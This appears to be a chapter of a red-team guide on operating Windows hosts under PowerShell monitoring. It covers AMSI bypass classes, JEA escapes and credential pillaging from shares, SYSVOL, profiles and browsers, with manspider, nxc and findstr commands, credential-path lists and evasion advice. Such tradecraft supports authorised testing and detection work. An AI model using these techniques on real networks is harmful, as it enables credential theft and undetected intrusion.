PowerShell was the best offensive tooling platform on Windows for about five years and is now the most heavily instrumented interpreter on any operating system. Treating it as a scripting language is a mistake; treat it as a monitored environment you are operating inside, and account for each layer of instrumentation separately.

### The layers, and what each one records

| Layer | Configured at | Records | Event |
| --- | --- | --- | --- |
| **Module logging** | `HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging`, per-module or `*` | Pipeline execution details: the command, its bound parameters and their values, after variable expansion | `4103` in `Microsoft-Windows-PowerShell/Operational` |
| **Script block logging** | `...\PowerShell\ScriptBlockLogging`, `EnableScriptBlockLogging` | The text of every script block compiled by the engine, including blocks generated at runtime, after deobfuscation, split across multiple events for long blocks | `4104` in the same log |
| **Transcription** | `...\PowerShell\Transcription`, with `EnableTranscripting` and `OutputDirectory` | A plain-text transcript of the whole session, input *and output*, written to a directory or share | A file, not an event |
| **Engine and provider lifecycle** | On by default | Session start and stop, host application, provider load | `400`, `403`, `600`, `800` in the classic `Windows PowerShell` log; `40961`, `40962` in the operational log |
| **AMSI** | Registered antimalware provider | Content submitted for scanning at each evaluation boundary, and detections | Defender `1116` and `1117`, plus provider telemetry |
| **ETW** | `Microsoft-Windows-PowerShell` provider | The transport for 4103 and 4104, consumed directly by EDR agents rather than via the event log | Not an event ID |

Three things about this set are commonly misunderstood and matter operationally.

**Script block logging cannot be fully disabled by policy.** Independently of the `EnableScriptBlockLogging` setting, PowerShell emits a `4104` event at *warning* level for script blocks whose content matches a built-in list of suspicious constructs, including a range of Win32 API names, `System.Reflection` usage, `VirtualAlloc`, and similar. So a host with script block logging "off" still logs the interesting subset, and that subset is precisely what your tooling contains.

**Script block logging defeats obfuscation by design.** It records the script block as the engine compiled it, which means after string concatenation, after `-join`, after base64 decoding through `Invoke-Expression`, after format-operator reassembly. Obfuscating a payload to get past a signature makes the 4104 event *more* anomalous, not less, because the log now contains both the obfuscated outer layer and the clean inner one.

**Transcription is the one that gets operations caught.** Module and script block logging record what you ran. Transcription records what you learned: the output of your enumeration, the contents of files you read, the credentials you printed. It is also written to disk in a readable format, frequently to a central share, and it survives your cleanup because you usually do not know it is happening. Check for it first, before you type anything you would not want recorded.

### AMSI

**What it is.** The Antimalware Scan Interface is a set of APIs by which a script host or runtime submits content to the registered antimalware provider for evaluation immediately before that content is acted on. It is not itself a scanner; it is the plumbing that gets content to one.

**Where it applies.** PowerShell, at each script block and each `Invoke-Expression`; `wscript` and `cscript` for VBScript and JScript; `mshta` for HTA content; Office VBA macros; WMI operations; UAC elevation requests; and the .NET Framework's assembly loading path from version 4.8 onwards, which is what catches `Assembly.Load` of a byte array.

**Why it is bypassable.** The provider is consulted by a library loaded into *your* process. `amsi.dll` is in your address space, its functions are at addresses you can compute, and its state is in memory you own. Nothing about that arrangement can be made trustworthy from inside a process the attacker controls. The bypass classes, roughly in order of how well detected each is now:

| Class | Mechanism | State |
| --- | --- | --- |
| Memory patching `AmsiScanBuffer` | Overwrite the function prologue so it returns a clean result | The oldest and most detected. Defender scans for the patched bytes, and ETW Threat Intelligence reports the protection change on the `amsi.dll` region |
| `amsiInitFailed` reflection | Set the private static field on `System.Management.Automation.AmsiUtils` so the engine believes AMSI initialisation failed and stops calling it | Requires `FullLanguage`. The reflection call itself is a well-known 4104 signature |
| AMSI context corruption | Corrupt the `AMSI_CONTEXT` structure so scan calls fail rather than return clean | Fewer memory-protection changes, so quieter than prologue patching |
| Hardware breakpoints | Set a debug-register breakpoint on `AmsiScanBuffer` and alter the return in the exception handler, leaving the code bytes untouched | Defeats byte-comparison integrity checks, but the debug register state and the vectored exception handler are themselves observable |
| Provider deregistration | Remove or redirect the provider CLSID so `AmsiInitialize` finds nothing. `HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable` set to `0` disables AMSI for the WSH script hosts specifically | Registry artefacts, easily detected, but genuinely simple and it needs no privilege |
| Avoidance | Use a host that does not call AMSI, or content that does not cross an AMSI boundary | The most reliable. Native code, a custom .NET host on a framework version without the assembly-load hook, or simply not using a scripted host |
| String obfuscation | Change the content so the provider's signatures do not match | Still works far more often than it should, because much AMSI detection is signature-based. It does nothing about 4104 logging |

The practical conclusion is the same as for everything else in this part: the more reliable answer is not to be in a scanned host. Compiled native code, or a C2 that executes .NET in memory on a runtime you control, avoids the whole layer rather than fighting it.

### JEA

**What it is.** Just Enough Administration is a constrained PowerShell remoting endpoint. A session configuration, registered with `Register-PSSessionConfiguration`, defines a `NoLanguage` session that exposes only a specified set of commands, and typically runs under a **RunAs** account or a virtual account with more privilege than the connecting user. The connecting user gets to perform a small number of specific administrative actions without ever holding administrative credentials.

**Why it is an escalation target.** The whole design rests on the exposed command surface being genuinely constrained. It usually is not. What to enumerate once connected:

```powershell
Get-Command                       # exactly what is visible, and nothing else exists
Get-Command -Name * | Select-Object Name, CommandType, ModuleName
(Get-Command SomeFunction).Parameters
$ExecutionContext.SessionState.LanguageMode
whoami                            # if exposed, tells you the RunAs identity
```

The findings that break out:

- **A visible function whose parameters are not validated.** A helper function that builds a command string from a parameter and invokes it, without a `ValidateSet` or `ValidatePattern`, is command injection into the RunAs context. This is the most common JEA escape by a wide margin, because the functions in role capability files are written by administrators, not by security engineers.
- **Any cmdlet that takes a `-ScriptBlock`, `-Command`, `-FilePath` or `-ArgumentList`.** `Start-Job`, `Invoke-Command`, `Start-Process`, `New-Service`, `Register-ScheduledTask` and `Invoke-Item` all execute something of your choosing.
- **`Add-Type`, `New-Object`, or anything giving .NET reach.** Rarely exposed deliberately, occasionally exposed because a legitimate function needed it.
- **Module import from an arbitrary path.** If you can write a module and get it imported, you supply the code.
- **File read and write cmdlets.** `Get-Content` on a file the RunAs account can read but you cannot is straightforward information disclosure; `Set-Content` or `Copy-Item` under a privileged account is an escalation via every mechanism in the privilege escalation section above.
- **A cmdlet with a `-Path` that reaches a UNC.** Coerces the RunAs account to authenticate outbound, which is a relay or capture opportunity.

Read the configuration itself where you can. Session configurations are `.pssc` files and role capabilities are `.psrc` files, both plain text, usually under a module's `RoleCapabilities` directory:

```powershell
Get-PSSessionConfiguration | Select-Object Name, PSVersion, RunAsUser, Permission
Get-ChildItem 'C:\Program Files\WindowsPowerShell\Modules' -Recurse -Include *.psrc, *.pssc -ErrorAction SilentlyContinue
```

**Detection and opsec.** JEA endpoints are, by their nature, configured by someone who cared about security, so they are usually the best-logged part of an estate. JEA has its own transcript capability that is commonly enabled, capturing everything the session did, and every command is recorded against your username with no ambiguity. Assume everything you do in a JEA session is attributed and reviewed.

### Working when PowerShell is unusable

There is a point at which PowerShell costs more than it is worth: WDAC enforcing, script block logging on, transcription to a share, AMSI with a competent provider, and CLM. Recognise it and change tools rather than escalating the fight.

**The best answer is to do the work remotely.** Domain enumeration, credential validation, Kerberos operations, LDAP queries, ADCS abuse, SMB share enumeration and most of the interesting parts of an internal engagement can be done from your own machine over the network with credentials, generating only ordinary protocol traffic on the target and running no code on it at all. `nxc`, `bloodyAD`, `certipy`, `ldeep`, `impacket` and `BloodHound` collectors that run remotely all exist precisely so that you do not need a shell on a Windows box. A host you never execute on cannot log what you executed.

**In-process .NET through your C2.** Executing a .NET assembly in your implant's memory avoids `powershell.exe` entirely, avoids AMSI on a framework and configuration where the assembly load hook is not in play, and produces no process creation event. This is the standard modern replacement for PowerShell tooling and the reason the GhostPack tools exist as assemblies rather than scripts.

**Native code.** Compiled C or C++, or Rust or Go, calling the Win32 API directly. No interpreter, no AMSI boundary, no script block logging. The cost is development time and a file that must satisfy application control.

**Built-in executables, for the things they do well.** These are always present, never blocked by application control, and generate a process creation event each, which is the trade.

| Task | Built-in |
| --- | --- |
| Local users, groups, sessions, shares | `net.exe`, `net1.exe` |
| Domain controller and trust discovery | `nltest.exe` |
| Directory queries | `dsquery.exe` where RSAT is present, otherwise `ldifde.exe` |
| SPN enumeration and modification | `setspn.exe` |
| Certificate operations, hashing, base64, download | `certutil.exe` |
| File transfer | `curl.exe`, which now ships in Windows, and `bitsadmin.exe` |
| Services | `sc.exe` |
| Scheduled tasks | `schtasks.exe` |
| Registry | `reg.exe` |
| ACLs | `icacls.exe` |
| Sessions | `query.exe`, `qwinsta.exe`, `quser.exe` |
| Process listing | `tasklist.exe` |
| WMI and CIM | `wmic.exe` where it survives; it is deprecated and removed as a Feature on Demand from current Windows builds, so prefer CIM from your own tooling |

**COM automation from a non-PowerShell host.** JScript or VBScript under `wscript`, `cscript` or `mshta` reaches WMI, ADSI, the shell object model and the file system without touching PowerShell. AMSI covers these hosts, but script block logging does not, and CLM has no equivalent for them.

**Where PowerShell is still worth using in CLM.** Do not abandon it entirely. Under `ConstrainedLanguage` the cmdlet surface is intact, so `Get-ADUser`, `Get-ADComputer`, `Get-ADObject` where RSAT is installed, `Get-ChildItem`, `Get-Content`, `Test-NetConnection`, `Resolve-DnsName`, `Get-CimInstance` and `Invoke-WebRequest` all work. That covers a large fraction of enumeration, and it uses only signed Microsoft modules doing what they are for, which is quieter than anything you would drop on disk.

## File and share pillaging

The source notes reduce this to two `manspider` invocations. Pillaging deserves better treatment, because in most real engagements the credential that ends the assessment came out of a file share rather than out of memory. It is also the single loudest thing in this document, so the operational discipline matters as much as the search terms.

### What you are actually looking for

Not "passwords". Four distinct categories, each with a different search strategy.

1. **Credentials in transit to a human.** Onboarding documents, handover notes, helpdesk scripts, spreadsheets named after a project, emails saved as files. These are found by *content* search for phrases, not by filename.
2. **Credentials in configuration.** Connection strings, API keys, service account passwords, tokens. Found by *extension and filename* search, because the file types are predictable.
3. **Credential *stores*.** Password manager databases, key files, certificate stores, SSH keys, cloud CLI caches. Found by extension, and valuable even when you cannot immediately open them, because master passwords are crackable and key files are often stored next to the database they protect.
4. **Information that makes the next step possible.** Network diagrams, asset inventories, runbooks, backup schedules, source code, infrastructure-as-code repositories. No credentials at all, but they tell you where to go next and are usually easier to find than credentials.

### Search terms that pay

Content terms, roughly in descending order of hit rate against real estates:

```text
password  passwd  pwd  passw
credential  creds
secret  apikey  api_key  api-key  token  bearer
net use  psexec  runas  /savecred
ConvertTo-SecureString  -AsPlainText
connectionstring  Data Source=  Integrated Security=false  User ID=
cpassword
BEGIN RSA PRIVATE KEY  BEGIN OPENSSH PRIVATE KEY  BEGIN PRIVATE KEY
sa password  administrator password  local admin
default password  temporary password  initial password
do not delete  do not change  IT only
onboarding  new starter  leaver  handover
```

Filename terms, which are cheaper to search than content because no file body needs reading:

```text
passw  pass  cred  login  logon  account  secret  key
admin  root  sa
config  conf  settings  connection
backup  bak  old  copy  archive
unattend  sysprep  answer
notes  todo  temp  scratch  Untitled  New Text Document
handover  onboarding  runbook  inventory  diagram
```

**`Untitled` is the cleverest term in the source's list and worth calling out.** It matches the default names of unsaved Notepad and Notepad++ buffers, exported OneNote pages, saved screenshots and "Untitled document" exports from web applications. Files with default names are files nobody intended to keep, which means they were written quickly, which means they were written by someone who needed to note something down temporarily. That is precisely the population of files most likely to contain a credential. `New Text Document`, `Document1`, `Book1`, `Copy of`, `Screenshot` and `Capture` all work for the same reason.

### File types worth extracting

| Category | Extensions |
| --- | --- |
| Documents and notes | `txt` `md` `rtf` `doc` `docx` `xls` `xlsx` `csv` `ppt` `pptx` `pdf` `one` `onetoc2` |
| Configuration | `config` `xml` `json` `yml` `yaml` `ini` `conf` `cfg` `properties` `env` `toml` |
| Scripts and code | `ps1` `psm1` `bat` `cmd` `vbs` `js` `py` `sh` `sql` `tf` `tfvars` `Dockerfile` |
| Credential stores | `kdbx` `kdb` `psafe3` `opvault` `agilekeychain` `1pif` |
| Keys and certificates | `pem` `key` `ppk` `pfx` `p12` `jks` `keystore` `cer` `crt` `id_rsa` `id_ed25519` |
| Connection and session files | `rdp` `vnc` `ovpn` `ica` `sdf` |
| Archives and images | `zip` `7z` `rar` `tar` `gz` `iso` `vhd` `vhdx` `vmdk` `bak` `bacpac` |
| Mail | `pst` `ost` `msg` `eml` |

Archives and virtual disk images deserve a note. They are large, so a size-limited sweep will skip them, and they are exactly where someone put the thing they did not want to lose. A `.vhdx` on a share is somebody's whole machine including its SAM hive. A `.bak` is a database. Do not automatically exclude them; note them and fetch them deliberately.

### Searching at scale without downloading everything

The mistake is to mount a share and recursively copy it. On a large file server that is terabytes, hours, and an unmissable telemetry signature. The correct pattern is always two-phase: **sweep metadata first, then fetch selectively.**

**Phase one, metadata only.** Enumerate every readable share on every host and record the full path, size and modification time of every file, without reading any file body.

```bash
# discover shares and readable permissions across the estate
nxc smb $TARGETS -u $USER -p $PASS -d $DOMAIN --shares

# enumerate file metadata across all readable shares into JSON, no content download
nxc smb $TARGETS -u $USER -p $PASS -d $DOMAIN -M spider_plus
```

`spider_plus` walks readable shares and writes a JSON catalogue per host containing paths, sizes and timestamps. That catalogue is the thing you actually work with: it is small, it is offline, you can grep and sort it as much as you like at no further cost to the target, and it lets you build a precise fetch list. Its `DOWNLOAD_FLAG` and file-size options let you selectively pull content in the same pass once you know what you want.

**Phase two, content search on a filtered population.** `manspider` is the right tool for content matching across many hosts, because it filters by extension and size before reading anything and only retains files that match.

```bash
# filename matching across a host list, no content download
manspider $TARGETS -u $USER -p $PASS -d $DOMAIN -f passw login logon cred secret Untitled -n

# content matching, restricted to file types worth reading
manspider $TARGETS -u $USER -p $PASS -d $DOMAIN -c password passwd cpassword ConvertTo-SecureString \
  -e ps1 bat cmd vbs config xml json ini conf txt xls xlsx doc docx pdf
```

The flag letters: `-f`/`--filenames` takes filename regexes, `-c`/`--content` takes content regexes, `-e`/`--extensions` restricts to extensions (`--exclude-extensions` inverts it), and `-n`/`--no-download` logs the hits without pulling the files back. `--sharenames` and `--exclude-sharenames` control which shares are visited, with `C$`, `IPC$`, `ADMIN$` and `PRINT$` excluded by default; `--dirnames` and `--exclude-dirnames` do the same for directories. `-s`/`--max-filesize` defaults to 10MB, `-t`/`--threads` to 5, and `-m`/`--maxdepth` to 10. Note that filename, extension and content criteria are combined with AND by default; `-o`/`--or-logic` switches to OR, which is usually what you actually want when you are casting a wide net.

**Common mistake.** Passing several criteria and expecting a union. `manspider -f passw -e xlsx` matches only files whose name contains `passw` *and* whose extension is `xlsx`, not either. On a first sweep that silently returns almost nothing. Add `-o`, or run the criteria as separate passes.

Two operational habits from the source notes worth keeping. First, wrap long-running spiders in `script` so you have a complete log of what was found even if the terminal dies:

```bash
script -a manspider-filenames
manspider $TARGETS -u $USER -p $PASS -f passw login cred Untitled -n
```

Second, run the broad, slow sweep in the background early and triage it later, while doing the targeted searches interactively. A whole-estate content sweep takes hours; start it at the beginning of the engagement, not at the end.

**On-host alternative.** When you have a foothold on a Windows box with a domain account, running the search from there rather than from your own machine means the SMB traffic comes from a host that legitimately accesses those shares. `Snaffler` is the tool built for exactly this: it enumerates computers from the domain, finds their shares, walks them, and classifies findings by rule with a severity score, which solves the triage problem at the same time as the search problem. Its output is dense and prioritised rather than a flat list of every file containing the string "password".

For a single mounted share, `findstr` and `ripgrep` do the job with no tooling to deploy:

```cmd
findstr /S /I /M /C:"password" \\$TARGET\share\*.config \\$TARGET\share\*.xml \\$TARGET\share\*.ps1
```

The `/M` switch prints only filenames, which keeps the output manageable and avoids dumping file contents into your terminal, and by extension into any transcript.

### SYSVOL and NETLOGON, the reliable first stop

Always start here. Three reasons, and they compound.

**It is readable by every authenticated domain user.** No permission discovery needed, no share enumeration, no guessing. `\\$DOMAIN\SYSVOL` and `\\$DOMAIN\NETLOGON` resolve to whichever domain controller answers, and read access is granted to `Authenticated Users` by design because every domain-joined machine must read it to apply policy.

**It contains operational scripts, not documents.** Logon scripts, startup scripts, deployment scripts, drive mapping scripts and scheduled task definitions all live here, and scripts contain credentials because a script cannot type a password at a prompt. `net use` with a plaintext password in a logon script is still a live finding in a large fraction of estates.

**Reading it is invisible.** Every workstation in the domain reads SYSVOL constantly. Your read is indistinguishable from ordinary group policy processing, which makes it the only high-value pillaging target with essentially no detection cost.

```cmd
dir /s /b \\%USERDNSDOMAIN%\SYSVOL\%USERDNSDOMAIN%\
findstr /S /I /M /C:"password" \\%USERDNSDOMAIN%\SYSVOL\%USERDNSDOMAIN%\*
findstr /S /I /C:"cpassword" \\%USERDNSDOMAIN%\SYSVOL\%USERDNSDOMAIN%\policies\*.xml
findstr /S /I /M /C:"net use" \\%USERDNSDOMAIN%\SYSVOL\%USERDNSDOMAIN%\scripts\*
```

```bash
nxc smb $DC -u $USER -p $PASS -d $DOMAIN -M gpp_password
nxc smb $DC -u $USER -p $PASS -d $DOMAIN -M gpp_autologin
nxc smb $DC -u $USER -p $PASS -d $DOMAIN --share SYSVOL --spider . --regex "password|cpassword|net use|ConvertTo-SecureString"
```

SYSVOL is small enough to copy in its entirety, which is the right approach: pull the whole tree once and search it offline as many times as you like, rather than making repeated searches against the domain controller.

### The user's own profile and browser data

Before searching the estate, search the host you are on. It is faster, it needs no credentials, and it belongs to a user who has already been chosen for you by whatever got you the foothold.

```text
%USERPROFILE%\Desktop, Documents, Downloads, OneDrive*, Dropbox, Google Drive
%APPDATA%\Microsoft\Windows\Recent            shortcut trail of every file recently opened, including on shares
%APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
%APPDATA%\Notepad++\backup\                   unsaved Notepad++ buffers, verbatim
%LOCALAPPDATA%\Packages\Microsoft.MicrosoftStickyNotes_*\LocalState\  Sticky Notes SQLite store
%LOCALAPPDATA%\Microsoft\Outlook\*.ost, *.pst mailbox, searchable offline
%USERPROFILE%\.ssh\                           keys, config, known_hosts as a target list
%USERPROFILE%\.aws\credentials, .azure\, .config\gcloud\, .kube\config
%USERPROFILE%\.git-credentials, .netrc, .npmrc, .pypirc, .docker\config.json
%APPDATA%\Microsoft\Windows\Credentials\      DPAPI credential blobs
```

`ConsoleHost_history.txt` is the single highest-value file in that list and the one most often skipped. PSReadLine records every command the user typed in PowerShell, across sessions, indefinitely, in plain text, with no size limit and no policy controlling it. Administrators paste credentials into PowerShell constantly. Read this file on every host you land on, before anything else.

The `Recent` folder is the second most useful, because the shortcuts it contains hold UNC paths. It is a curated list of exactly which shares and which files this user considers important, assembled by the user themselves.

**Browsers.** Chromium-based browsers store saved logins in a SQLite database, `Login Data`, encrypted with a key held in `Local State` which is itself DPAPI-protected to the user. As that user, decryption is straightforward. Chrome version 127 and later introduced app-bound encryption on Windows, which binds the key to the browser's own identity and requires either SYSTEM privileges or in-process theft from the browser rather than a simple file copy, so the older copy-and-decrypt approach now fails on current Chrome and Edge. Firefox uses `logins.json` with `key4.db` in the profile directory, protected by a master password only if the user set one, which they did not.

```text
%LOCALAPPDATA%\Google\Chrome\User Data\Default\        Login Data, Cookies, History, Web Data, Bookmarks
%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\       same layout
%APPDATA%\Mozilla\Firefox\Profiles\*\                  logins.json, key4.db, cookies.sqlite, places.sqlite
```

**Cookies are now often worth more than passwords.** A saved password to a system behind single sign-on and multi-factor authentication is of limited use. A live session cookie for that same system bypasses both. Prioritise `Cookies` over `Login Data`, and prioritise the browser history and bookmarks too, because they are a map of every internal application the organisation runs, which is otherwise expensive to discover.

Also worth checking: WSL filesystems under `%LOCALAPPDATA%\Packages\` for a whole second operating system's worth of dotfiles and keys, and any local git repositories, because a credential removed from a repository's current state usually remains in its history.

### Triaging a very large result set

A whole-estate sweep returns tens of thousands of files. The problem is no longer finding things, it is deciding what to read. What works:

**Deduplicate by hash first.** File shares are full of copies. Hashing the collected corpus typically removes a third to a half of it before you read anything.

**Sort by directory, not by file.** Findings cluster. One directory containing forty hits is one investigation; forty directories containing one hit each is forty. Group by parent path and work through the densest clusters first.

**Weight by filename and extension over content match.** A file called `passwords.xlsx` containing no matches is more interesting than a 200-page PDF containing the word "password" in a policy statement. Content matching produces the bulk of the false positives, and almost all of them come from documents about security rather than documents containing secrets.

**Weight by recency and by size.** A small file modified last week beats a large file from 2014. Credentials in current use live in small, recently touched files.

**Run credential-specific detection over the corpus rather than reading it.** Once you have a local collection, tools built for finding secrets in text do a far better job than grep: `trufflehog`, `gitleaks` and `noseyparker` all detect high-entropy strings and known credential formats with validation, and they run offline against a directory tree.

**Grep for credential formats, not for the word password.** Known prefixes and structures are near-zero false positive:

```text
AKIA / ASIA          AWS access key IDs
ghp_ / gho_ / ghs_   GitHub tokens
xoxb- / xoxp- / xapp- Slack tokens
sk-                  various API keys
eyJ                  base64 JWT headers
-----BEGIN           PEM key blocks
Server=...;Password= ADO.NET connection strings
```

**Do not collect what you cannot triage.** Bringing back 400 GB you will never open is pure risk with no return. Every file that crosses the network is an opportunity to be detected, so the sweep must be selective by design rather than filtered after the fact.

### Operational care

Pillaging is the loudest activity in this document, and the reasons are worth being specific about.

**File access auditing volume.** Where a SACL is present, every file read produces a **4663**. Detailed file share auditing produces a **5145** per access check on a network share and **5140** on share connection. A recursive sweep of a file server generates these by the tens of thousands, from one account, in a short window, in a strictly sequential directory order. That pattern is the canonical precursor signature for both ransomware and bulk exfiltration, and it is detected by essentially every SIEM content pack in existence. It does not require anyone to be clever; the volume alone triggers it.

**Data loss prevention.** DLP agents inspect file reads and file movements, and they are tuned for exactly what you are doing: bulk access to document repositories, staging of archives, and content matching for credentials and regulated data. Creating a large archive of collected files on the host, then moving it, is the single most reliable way to fire a DLP rule. Stream findings out rather than staging them, and if you must stage, stage small.

**Honeyfiles and canary tokens.** Planting attractive files is now common and cheap. A file called `passwords.xlsx` or `Domain Admin Credentials.docx` in the root of a share, or a `Groups.xml` with a `cpassword` that decrypts to something plausible, should be assumed to be a canary until proven otherwise. Two rules follow. First, treat a suspiciously convenient finding with suspicion proportional to its convenience. Second, and more importantly, **do not open collected files with a client that will beacon.** Office documents, PDFs and HTML files can all reference remote content that fires on open, and canary tokens are usually implemented exactly that way. Inspect suspect documents by extracting their text and examining their relationships offline, not by double-clicking them.

**Identity-focused detection.** Products in the Defender for Identity class have specific detections for enumeration of shares and for data exfiltration over SMB, keyed on an account accessing an unusual number of hosts or an unusual volume of data relative to its own baseline. A service account that has never browsed a file share suddenly walking forty of them is the detection, regardless of what it read.

**Egress volume.** Pulling gigabytes out through your C2 channel produces a traffic profile no legitimate application produces, and proxy and network monitoring alert on volume to a single destination even when the content is opaque.

The mitigations are all the same shape: reduce volume, spread it out, and be selective early rather than late. Sweep metadata rather than content. Filter by extension and size before reading. Use an account and a source host for which the access is plausible. Spread the sweep across hours rather than minutes and across several source hosts rather than one. Exclude the shares that are obviously worthless, such as software distribution points and user profile redirection roots you have no interest in, because they are the bulk of the volume. And accept partial coverage: three credentials from a targeted search are worth more than a complete index of a file server you got caught building.

## Detection: what host enumeration looks like to EDR

### The signature is the sequence, not the command

This is the single most important idea in this section. `whoami` is not malicious. `net user` is not malicious. `ipconfig /all` is run by helpdesk staff a thousand times a day. No competent detection engineer writes a rule that alerts on any one of them, because the false positive rate would make the product unusable.

What they write rules for is **density and composition**. Six or more distinct reconnaissance commands, from a known lexicon, executed by the same process tree, within a short window, with no interactive user at the console. That combination has essentially no benign explanation, and it is trivially detectable from process creation events alone. Every EDR product implements some version of it, usually as a scored aggregation rather than a single rule, and it is why running `winPEAS` or an equivalent all-in-one script is such a reliable way to get caught: it executes the entire lexicon in thirty seconds, which is the strongest possible instance of the signal.

The corollary is that spacing your enumeration out is not superstition. A scoring window that resets means five commands over twenty minutes may never reach the threshold that five commands over twenty seconds crosses instantly.

### The reconnaissance lexicon

These are the commands that appear in detection content as reconnaissance indicators. Individually low fidelity, collectively decisive.

| Category | Commands | ATT&CK |
| --- | --- | --- |
| System information | `systeminfo`, `hostname`, `ver`, `set`, `wmic os get`, `Get-ComputerInfo` | T1082 |
| Account and identity | `whoami`, `whoami /priv`, `whoami /groups`, `whoami /all`, `net user`, `net user /domain`, `query user`, `quser` | T1033, T1087 |
| Group discovery | `net group`, `net group "Domain Admins" /domain`, `net localgroup administrators`, `Get-ADGroupMember` | T1069 |
| Domain and trust | `nltest /domain_trusts`, `nltest /dclist`, `net view /domain`, `Get-ADTrust`, `dsquery` | T1482, T1018 |
| Network configuration | `ipconfig /all`, `route print`, `arp -a`, `netstat -ano`, `netsh interface show`, `nbtstat -n` | T1016 |
| Network shares | `net share`, `net view \\host`, `net use` | T1135 |
| Process discovery | `tasklist`, `tasklist /svc`, `tasklist /v`, `Get-Process` | T1057 |
| Software and security product discovery | `wmic product get`, `Get-MpComputerStatus`, `Get-MpPreference`, `fltmc`, `sc query`, `Get-Service`, `driverquery`, the registry service-key enumeration | T1518, T1518.001 |
| Scheduled tasks and services | `schtasks /query`, `sc queryex`, `Get-ScheduledTask` | T1053, T1007 |
| Credential locations | `cmdkey /list`, `reg query ... /f password /s`, `vaultcmd /list` | T1555 |
| Virtualisation and sandbox checks | `wmic computersystem get model`, BIOS and disk model queries | T1497 |
| Shadow copies and backups | `vssadmin list shadows`, `wbadmin get versions` | T1490, T1006 |
| Permission discovery | `icacls`, `accesschk`, `cacls`, `Get-Acl` at volume | T1069, T1222 |

`whoami /priv` deserves a specific mention because it has an unusually high signal-to-noise ratio. Administrators run `whoami` occasionally; almost nobody runs `whoami /priv` except someone assessing a token for escalation. The same applies to `net localgroup administrators` and `cmdkey /list`.

### What else gives you away

**Parent-child anomalies, which are higher fidelity than the commands themselves.** Any of the above with the wrong parent is an alert on its own, no aggregation required.

| Parent | Why it matters |
| --- | --- |
| `w3wp.exe`, `httpd.exe`, `tomcat*.exe` | A web server spawning a shell is a web application compromise |
| `sqlservr.exe` | `xp_cmdshell` or a CLR assembly, so a database compromise |
| `winword.exe`, `excel.exe`, `outlook.exe`, `powerpnt.exe` | Macro or exploit execution from a document |
| `wmiprvse.exe`, `services.exe`, `svchost.exe` with an unusual service | Remote execution, so lateral movement inbound |
| `mshta.exe`, `rundll32.exe`, `regsvr32.exe`, `installutil.exe`, `msbuild.exe` | Living-off-the-land execution, and every one of these is watched by name |
| `explorer.exe` with no interactive session | Something is masquerading as user activity |
| An orphaned process, or one whose parent has exited | Common to injection and to process hollowing |

**Process creation telemetry sources.** Security event **4688** with the command line, where `Include command line in process creation events` is enabled by policy; Sysmon event **1**, which includes command line, hashes, parent image and parent command line; the `Microsoft-Windows-Kernel-Process` ETW provider; and every EDR agent's own kernel process-notify callback. Assume at least one of these is active and that the full command line is recorded, including anything you passed as an argument. Passwords on a command line are recorded verbatim.

**Other telemetry that catches enumeration specifically.** Sysmon **3** for network connections, which catches your SMB fan-out during share enumeration; Sysmon **7** for image loads, which catches your DLL; Sysmon **8** and **10** for remote thread creation and process access, which catch injection and LSASS access; Sysmon **12** to **14** for registry activity, which catch autorun and handler-hijack writes; Sysmon **11** for file creation, which catches every tool you drop; and PowerShell **4104** for everything you run in a scripted host.

**LDAP query patterns.** On-host domain enumeration through `PowerView`, ADSI or the AD module produces a distinctive series of LDAP searches with broad filters and large attribute lists. Microsoft Defender for Identity and equivalent products profile this directly and alert on account enumeration and reconnaissance behaviour, keyed on the query shape rather than the tool. A BloodHound collection run from a host is one of the most reliably detected actions available. Collecting remotely over LDAP with credentials does not avoid this, since the detection is on the domain controller side, but it does avoid all the host-side telemetry, so it is still preferable.

### How to enumerate more quietly

In descending order of impact:

1. **Do it from off-host.** Domain enumeration, share discovery, credential validation and most Active Directory work can be performed over the network from your own machine.
